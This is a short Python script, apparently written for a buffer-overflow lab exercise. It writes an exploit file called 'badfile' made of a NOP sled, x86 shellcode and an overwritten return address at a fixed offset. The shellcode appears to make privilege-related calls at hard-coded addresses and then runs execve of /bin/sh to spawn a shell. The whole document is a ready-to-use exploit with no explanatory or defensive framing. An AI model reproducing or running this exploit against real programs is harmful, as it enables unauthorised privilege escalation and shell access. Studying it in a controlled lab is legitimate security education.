#!/usr/bin/python3
import sys 
 
shellcode= ( 
"\x31\xC9\x31\xC0\xB0\x01\xB1\x08\x51\x50\xBB\x86\x62\x55\x56\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\xB1\x05\x51\x50\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\xB1\x04\x51\x50\xFF\xD3\xBB\xD1\x62\x55\x56\xFF\xD3\x6A\x12\xBB\x00\x63\x55\x56\xFF\xD3\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x31\xD2\x31\xC0\xB0\x0B\xCD\x80"
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(2197)) 
# Put the shellcode at the end 
start = 2197 - len(shellcode) 
content[start:] = shellcode 
 
# Put the address at offset 989
ret = 0xffffcc98 + 250 
offset = 985 + 4
content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f:
    f.write(content) 

